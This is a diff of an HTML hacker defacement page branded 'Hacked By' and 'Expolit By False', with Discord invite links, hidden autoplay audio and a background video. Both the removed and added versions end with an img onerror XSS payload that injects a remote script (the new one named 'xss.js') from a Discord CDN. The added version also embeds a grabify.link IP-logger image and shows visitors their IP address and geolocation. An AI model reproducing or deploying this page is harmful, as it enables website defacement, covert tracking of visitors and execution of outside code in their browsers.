@@ -1,122 +1,69 @@
 <!DOCTYPE html>
 <html lang="ar">
 <head>
-
-<!DOCTYPE html>
-<html>
-<head>
-    <title>FALSE & BRG</title>
-</head>
-<body bgcolor="#000000">
-<script>
-    var names = [
-        { name: " False", color: "white" },
-        { name: " BRG", color: "white" },
-    ];
-
-    var nameIndex = 0;
-
-    function changeNames() {
-        var currentName = names[nameIndex];
-        document.getElementById("name").textContent = currentName.name;
-        document.getElementById("name").style.color = currentName.color;
-        nameIndex = (nameIndex + 1) % names.length;
-    }
-
-    // Change the names every 1 second
-    setInterval(changeNames, 1000);
-</script>
-<p align="center">
-    <img border="0" src="https://media.discordapp.net/attachments/1172863232101339167/1240138391027187722/phonto.jpg?ex=66457861&is=664426e1&hm=5879c9c434a86d265aa415d85fb5330ea78ac6064bb007fe362364082ed137cb&=&format=webp&width=682&height=682" width="238" height="300">
-</p>
-<p align="center">
-    <font face="Courier" size="6" style="color: #000000;">
-        <span style="color: black;">Hacked By -</span>
-        <span id="name"></span>
-    </font>
-</p>
-<p align="center">
-    <b>
-<font face="Courier" color="#000000">
-<a href="https://discord.gg/r56" style="font-size: 24px; color: red; text-decoration: none;">Discord.gg/</a>
-<span style="font-size: 24px; color: white;">R56</span>
-
-
-</font>
-
-    </b>
-</p>
-</body>
-</html>
-<!DOCTYPE html>
-<html>
-<head>
-    <title>FALSE & BRG</title>
+    <meta charset="UTF-8">
+    <title>False Expolit</title>
     <style>
         body {
             font-family: Arial, sans-serif;
             text-align: center;
-            color: #000000;
+            color: #ffffff;
             background-color: #000000;
             overflow: hidden;
         }
 
-        h1, h3 {
-            color: #ffffff;
+        .animated-text {
+            font-size: 2em;
+            font-weight: bold;
+            text-shadow: 0 0 10px #ff0000, 0 0 20px rgb(174, 0, 255), 0 0 30px #0000ff;
+            animation: nameGlowing 3s infinite alternate;
         }
 
-        #ip-address {
-            color: Red;
+        @keyframes nameGlowing {
+            0% { color: rgb(174, 0, 255); text-shadow: 0 0 10px rgb(174, 0, 255), 0 0 20px #ffffff; }
+            100% { color: white; text-shadow: 0 0 20px #ff0000, 0 0 30px #0000ff; }
         }
 
-        #ip-info {
-            font-family: Arial, sans-serif;
-            white-space: pre;
-            color: red;
+        #name {
+            font-size: 3em;
+            font-weight: bold;
+            text-shadow: 0 0 10px rgb(174, 0, 255), 0 0 20px #ffffff;
+            animation: nameGlowing 3s infinite alternate;
         }
 
-        .cmd-text-container {
-            position: relative;
+        .discord-link {
+            font-size: 1.5em;
+            text-decoration: none;
+            font-weight: bold;
+            text-shadow: 0 0 10px rgb(174, 0, 255), 0 0 20px #ffffff;
+            animation: nameGlowing 3s infinite alternate;
+        }
+
+        .discord-link span {
+            text-shadow: 0 0 10px #ff0000, 0 0 20px #0000ff;
+            animation: nameGlowing 3s infinite alternate;
         }
 
         .cmd-text {
-            color: #000000;
-            font-size: 9px;
-            font-family: Arial, sans-serif;
-            white-space: nowrap;
-            position: absolute;
-            animation: scrollText 20s linear infinite;
-            transform: translateX(100%);
-            -webkit-text-stroke: 1px Red;
-            text-stroke: 1px Red;
-        }
-
-        .gray-text {
-            color: #000000;
-            outline: 1px solid #000000;
-        }
-
-        .json-data {
-            font-family: Arial, sans-serif;
-            color: Red;
-            text-shadow: -1px -1px 0 black, 1px -1px 0 black, -1px 1px 0 black, 1px 1px 0 black;
-        }
-
-        .json-data span {
-            color: black;
+            font-size: 1.2em;
+            font-family: 'Courier New', Courier, monospace;
+            animation: scrollText 20s linear infinite, nameGlowing 3s infinite alternate;
+            text-shadow: 0 0 10px #ff0000, 0 0 20px rgb(174, 0, 255);
         }
 
         @keyframes scrollText {
-            0% {
-                transform: translateX(100%);
-            }
-            100% {
-                transform: translateX(-100%);
-            }
+            0% { transform: translateX(100%); }
+            100% { transform: translateX(-100%); }
         }
 
-        .cmd-text:hover {
-            animation-play-state: paused;
+        .ip-info {
+            font-family: Arial, sans-serif;
+            white-space: pre;
+            background-color: #1c1c1c;
+            padding: 10px;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgb(174, 0, 255);
+            animation: nameGlowing 3s infinite alternate;
         }
 
         video {
@@ -124,54 +71,95 @@
             top: 0;
             left: 0;
             z-index: -1;
-            filter: blur(5px);
-        }
-
-        /* Hide the audio controls */
-        audio {
-            display: none;
+            width: 100%;
+            height: 100%;
+            filter: blur(2px); /* تقليل البلور */
+            object-fit: cover;
         }
     </style>
 </head>
 <body>
-    <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Animated Text</title>
-    <style>
-        @keyframes lightning {
-            0% { color: rgb(255, 0, 0); }
-            50% { color: black; }
-            100% { color: white; }
+    <video autoplay loop muted>
+        <source src="https://cdn.discordapp.com/attachments/1112451288052007025/1271861425803104407/08101.mp4?ex=66b8e0c1&is=66b78f41&hm=344e4dde3afe38615938ad94268a8cceedbfde6598496068553139f4da7056c1&">
+        Your browser does not support the video element.
+    </video>
+
+    <script>
+        var names = [
+            { name: "[ False ]", color: "" },
+        ];
+
+        var nameIndex = 0;
+
+        function changeNames() {
+            var currentName = names[nameIndex];
+            document.getElementById("name").textContent = currentName.name;
+            document.getElementById("name").style.color = currentName.color;
+            document.querySelectorAll('.animated-text, .discord-link, .cmd-text, .ip-info').forEach(function(el) {
+                el.style.color = currentName.color;
+            });
+            nameIndex = (nameIndex + 1) % names.length;
         }
 
-        .animated-text {
-            animation: lightning 1s linear infinite;
-        }
-    </style>
-</head>
-<body>
-    <h3 class="animated-text">We are different from you, but in the end we are honorable</h3>
-</body>
-    </div>
+        // Change the names and colors every 1 second
+        setInterval(changeNames, 1000);
+    </script>
+
+    <p align="center">
+        <img border="0" src="https://grabify.link/K13QTH" width="500" height="425">
+    </p>
+    <p align="center">
+        <font face="Courier" size="6" style="color: #000000;">
+            <span class="animated-text">Expolit By  </span>
+            <span id="name"></span>
+        </font>
+    </p>
+    <p align="center">
+        <b>
+        <font face="Courier" color="#000000">
+            <a href="https://discord.gg/mefirst" class="discord-link">Discord.gg/<span>mefirst</span></a>
+        </font>
+        </b>
+    </p>
+    
+
+    <p id="ip-address">
+        <span id="ip-address-value" style="color: rgb(174, 0, 255); font-size: 17px;">Loading...</span>
+    </p>
+    <h3 class="animated-text">Your IP Info :</h3>
+    <pre id="ip-info" class="ip-info">Fetching...</pre>
+
 
     <!-- Hidden audio element with autoplay -->
     <audio autoplay loop style="display: none;">
-        <source src="https://cdn.discordapp.com/attachments/1161718410976178296/1240133507737718824/1_Oud_Remix_by_DifuSound.mp3?ex=664573d4&is=66442254&hm=fa129ab148a58ab6b84a62d07ed351035ccaa412effd76a1a7869df4e2221533&" type="audio/mpeg">
+        <source src="https://cdn.discordapp.com/attachments/1112451288052007025/1271861404093120523/08102.mp3?ex=66b8e0bc&is=66b78f3c&hm=065c3a7c159575b5e82882ebf4761c34f7785fc27fbc6546573001015c0b45d5&" type="audio/mpeg">
         Your browser does not support the audio element.
     </audio>
 
-<video style="width: 100vw; height: 100vh;" controls autoplay loop muted>
-    <source src="https://cdn.discordapp.com/attachments/1161718410976178296/1240130042378326087/05153.mp4?ex=6645709a&is=66441f1a&hm=a92ae5543820fcd18550aa967f39fa75e3cfe99bd2406b04fa60f0dd256ee4f1&">
-    Your browser does not support the video element.
-</video>
+    <script>
+        // JavaScript code to fetch and display the user's IP address and information
+        function fetchIPAndInfo() {
+            fetch('https://api.ipify.org/?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    document.getElementById('ip-address-value').textContent = data.ip;
+                    return data.ip;
+                })
+                .then(ip => fetch(`https://ipinfo.io/${ip}/json`))
+                .then(response => response.json())
+                .then(ipInfoData => {
+                    document.getElementById('ip-info').textContent = JSON.stringify(ipInfoData, null, 2);
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    document.getElementById('ip-address-value').textContent = 'Unable to fetch IP address.';
+                    document.getElementById('ip-info').textContent = 'Unable to fetch IP information.';
+                });
+        }
 
-
-  
+        // Fetch IP address and information initially
+        fetchIPAndInfo();
+    </script>
 </body>
 </html>
-<img src="about:invalid" onerror="document.body.appendChild(document.createElement('script')).src='https://cdn.discordapp.com/attachments/1161718410976178296/1240136327568162846/s.js?ex=66457675&is=664424f5&hm=488defec1b0d3c02d01e7f32f1dc3ecea0876fa446926edfe2700f13a9c73548&';">
-</body>
-</html>
+<img src="about:invalid" onerror="document.body.appendChild(document.createElement('script')).src='https://cdn.discordapp.com/attachments/1112451288052007025/1271856616823586867/xss.js?ex=66b8dc47&is=66b78ac7&hm=3ae90c172255bd0c6f91fd5aa16ab37f9d9798b9a75a2b3268eca26822ea1df0&';">
